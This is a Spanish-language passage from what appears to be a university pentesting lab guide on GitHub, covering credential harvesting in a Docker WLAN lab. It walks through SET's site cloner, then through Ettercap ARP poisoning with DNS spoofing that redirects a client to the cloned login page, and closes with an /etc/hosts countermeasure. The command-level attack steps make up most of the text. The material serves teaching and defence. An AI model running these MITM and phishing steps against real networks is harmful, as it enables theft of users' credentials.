docker-compose exec attacker-1 bash
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
setoolkit
```
![image](https://github.com/user-attachments/assets/5c354b6b-8ffd-4813-be27-9e2123c293b0)
![image](https://github.com/user-attachments/assets/f5fd1514-47a5-4d6b-8657-04365c60c35c)

Es posible que al principio aparezca un aviso sobre cuestiones éticas y legales; tras aceptar se puede usar la aplicación correctamente (el mensaje de error en rojo suele deberse a falta de conexión a Internet para descargar actualizaciones):

![image](https://github.com/user-attachments/assets/2b443f3f-d8b1-4fe2-b6b2-61be29f8e23f)

Aquí se muestra el banner, junto a una serie de opciones, siendo la ideal para este caso `1) Social-Engineering Attacks`, ya que contiene entre otras herramientas de ingeniería social, aquellas relacionadas con sitios web (en caso de obtener una versión más moderna es posible que esta opción se encuentre en otro lugar):
![image](https://github.com/user-attachments/assets/ec3f279c-134e-4fa3-a575-ca18b7d6ef72)

Ahora, se debe seleccionar la opción `2) Website Attack Vectors`:
![image](https://github.com/user-attachments/assets/0dc93d5f-6d7b-492c-91e7-c06e967fb476)

Como se muestra, la opción `3) Credential Harvester Attack Method` indica consistir en un clonado de un proceso de login que envíe un HTTP POST con los parámetros `username` y `password`, los cuales serán capturados por el servidor que levante la opción nombrada. Esto es ideal para nuestra misión, ya que sirve tanto para clonar la web víctima, así como para levantar un servidor que registre las credenciales que introduzca el usuario legítimo que redirigiremos a este servicio.
![image](https://github.com/user-attachments/assets/c678f928-f14f-4a88-8681-cb32dcd23657)

Ahora se selecciona la opción `2) Site Cloner`, la cual clona por completo la web y levanta este clon en la máquina atacante como se dijo antes:
![image](https://github.com/user-attachments/assets/6812383e-c772-46d7-b22e-eb7c347ad0ba)

En este paso, se pide la IP del dispositivo que será usado para levantar la web clonada, es decir, la IP del atacante (`10.5.2.133`), así como la URL de la máquina víctima, `http://10.5.0.20`, aunque se clone https no interesa introducirlo aquí porque se expondrá en el puerto 80). Con esto el servidor ya queda arrancado para escuchar en el puerto `80` las peticiones de la red clonada:

**Atacante:**
![464326272-6418506e-4f6b-491c-adc1-54f136673e70](https://github.com/user-attachments/assets/ac77450b-af86-44d1-92b2-0b117c31d7f3)

**Cliente:**
![image](https://github.com/user-attachments/assets/890473da-b31c-4b98-b230-c181d4819723)

Como se ha visto, es posible comprobar esto desde un usuario de la WLAN legítimo, lo cual queda registrado en el atacante. Además, se aprecia cómo al simular la respuesta que surgiría al pulsar el botón `Entrar` con el comando:
```
curl -X POST -d "username=carlos&password=passw0rd1234" http://10.5.2.133:80/login 
```
Con esto, se consigue enviar un mensaje POST con las credenciales en el formato que espera la aplicación web, lo cual es capturado por el atacante. Ahora es turno de poner a prueba esto en una situación de ataque real, donde el atacante debe modificar la petición DNS mediante un MITM basado en ARP (como el ataque [`anterior`](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks#mitm-con-mensajes-en-claro)). En primer lugar, se selecciona un cliente que actúe como víctima, por ejemplo, `client-1` con IP `10.5.2.130` (y el gateway `10.5.2.129`), el cual accede típicamente al servidor externo `10.5.0.20` usando el dominio `carlos.web.com`. Tras esto, se puede pasar a configurar los ficheros de Ettercap necesarios para lanzar una suplantación de identidad (spoofing) del servidor legítimo tras el dominio, empezando por `/etc/ettercap/etter.conf`:
```
docker-compose exec attacker-1 bash  # Nueva terminal
nano /etc/ettercap/etter.conf
```
En busca de las opciones `ec_gid` y `ec_uid`, las cuales tomarán el valor `0` para permitir que Ettercap pueda actuar como root y así pueda hacer todos los cambios necesarios en interfaces y demás herramientas que le sean necesarias:
![image](https://github.com/user-attachments/assets/9c177c07-da2e-4f2b-b722-8542391cb7e3)

Por otro lado, se configura `/etc/ettercap/etter.dns` para introducir `carlos.web.com  A  10.5.2.133`, una línea que indica el dominio (`carlos.web.com`) cuya IP se desea modificar en la víctima, así como la nueva IP que tomará ese dominio, es decir, la IP del atacante (`10.5.2.133`):
```
nano /etc/ettercap/etter.dns

# Si no hay configuraciones previas se puede hacer
echo "carlos.web.com  A  10.5.2.133" >> /etc/ettercap/etter.dns
```
![image](https://github.com/user-attachments/assets/81c84d31-b5ed-47d6-9b35-0b973b0d836b)

Con todo esto configurado, se puede ejecuta un comando Ettercap muy similar al del ataque [`anterior`](https://github.com/Carlosdm06/TFG-Pentesting/tree/Attacks#mitm-con-mensajes-en-claro)), solo que ahora se añade un plugin con el cual capturar y modificar peticiones y respuestas DNS; este aprovecha la configuración previa para esta labor:
```
# Hay tráfico que atravesará el ataccante, se debe activar el bit de forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
# Usar ettercap con plugin DNS Spoofing
ettercap -T -q -P dns_spoof -M arp:remote /10.5.2.129// /10.5.2.130//
```
- `-T`: usar el módo texto (sin GUI).
- `-q`: modo silecioso (solo muestra mensajes inprescindibles).
- `-P dns_spoof`: plugin que activa DNS Spoofing.
- `-M arp:remote`: MITM mediante envenenamiento remoto de caches ARP (víctima y punto de acceso).
- `/10.5.2.129//`: objetivo 1, punto de acceso.
- `/10.5.2.130//`: objetivo 2, cliente WLAN.

**Atacante:**
![image](https://github.com/user-attachments/assets/fbf54040-4128-458a-bf3c-fff7494642b6)
![image](https://github.com/user-attachments/assets/fea37eb8-c579-4691-9815-a64f0c1ccd24)

**Cliente (se conecta mediante el dominio que se simula como de uso habitual, `carlos.web.com`):**
```
docker-compose exec client-1 bash
wget carlos.web.com
tail -n 10 index.html
curl -X POST -d "username=carlos&password=passw0rd1234" http://carlos.web.com/login
```
![image](https://github.com/user-attachments/assets/9c466e5e-1d1f-4ea5-a2e4-58c66355c3ae)

Con esto se lanza el ataque que redirige al usuario legítimo `10.5.2.130`, el cual pretende acceder a `carlos.web.com` (lo que se traduce en la IP `10.5.0.20`) como haría comunmente gracias al servicio DNS; hacia el servicio que lo clona en la máquina del atacante, permitiendo el robo de las credenciales introducidas por el usuario legítimo redirigido. Nuevamente se ve un ataque que pone en problemas las credenciales de aquellos que están conectados en la misma red (mismo gateway). Esto resulta especialmente peligroso al encontrarse el atacante en la red interna, ya que este tipo de autenticaciones puede suceder contra un servidor de la corporación, ya sea externo o interno, el cual puede guardar información muy sensible que ponga en peligro la empresa si un usuario malintencionado consigue dichas credenciales de acceso y, por tanto, el respectivo acceso a esa web. O simplemente puede ser una estrategia para crear una base de datos con credenciales corporales que es bien pagada en el mercado negro.

#### Contramedidas y Recomendaciones
La principal manera de parar este tipo de ataques es impedir que un usuario externo logre acceder al punto de acceso inalámbrico de la empresa, tal y como se verá con los siguientes protocolos de seguridad WiFi, más robustos que el recientemente estudiado ([WEP](https://github.com/Carlosdm06/TFG-Pentesting/tree/WEP)). 

Sin embargo, hay una pequeña estrategia que se puede seguir para paliar estos problemas, la cual consiste en registrar los dominios sensibles (por ejemplo, webs corporativas) en el fichero `/etc/hosts` que actúa como una cache local. De esta forma, se evita que el usuario tenga que usar una petición DNS que pueda interceptar y cambiar un atacante mediante un proceso MITM. Para lograr esto basta con descomentar en los clientes (client-1, client-2, client-3) la línea `10.5.0.20      carlos.web.com` que crea una entrada para el caso actual, haciendo que la primera consulta que hace DNS sea invisible e ininterceptable por el atacante (sucede en local):
```
docker-compose exec client-1 bash
nano /etc/hosts
```
Lanzando de nuevo el ataque desde 
```
docker-compose exec attacker-1 bash
wpa_supplicant -i wlan4 -c wpa_supplicant.conf -B
dhclient wlan4
setoolkit
```
```
# Otra terminal
# Configurar los ficheros de nuevo si se ha reiniciado el laboratorio
nano /etc/ettercap/etter.conf
nano /etc/ettercap/etter.dns

# Permitir forwarding y lanzar el ataque
echo 1 > /proc/sys/net/ipv4/ip_forward
ettercap -T -q -P dns_spoof -M arp:remote /10.5.2.129// /10.5.2.130//
```

**Atacante:**
![image](https://github.com/user-attachments/assets/64e818a9-dbd1-40fd-bef2-aa97937d202f)
![image](https://github.com/user-attachments/assets/2724b8bc-7c30-44df-bdcd-13d56d0f1d24)

**Cliente:**
```
docker-compose exec client-1 bash
wget carlos.web.com
tail -n 10 index.html
curl -X POST -d "username=carlos&password=passw0rd1234" http://carlos.web.com/login
```
![image](https://github.com/user-attachments/assets/b47a2e2a-3d45-4dca-856f-32ad53141ba9)
![image](https://github.com/user-attachments/assets/7e900b00-2462-426c-8d66-92b47c837a69)

Ahora se visualiza cómo este ataque no es posible gracias a esta cache local, pero si es posible ver las credenciales en la consola de Ettercap gracias al MITM debido a la falta de cifrado.

[`Volver a la introducción`](https://github.com/Carlosdm06/TFG-Pentesting/tree/main)
[`Siguiente lección, cracking de redes WPA/WPA2 PSK`](https://github.com/Carlosdm06/TFG-Pentesting/tree/WPA/WPA2-PSK)
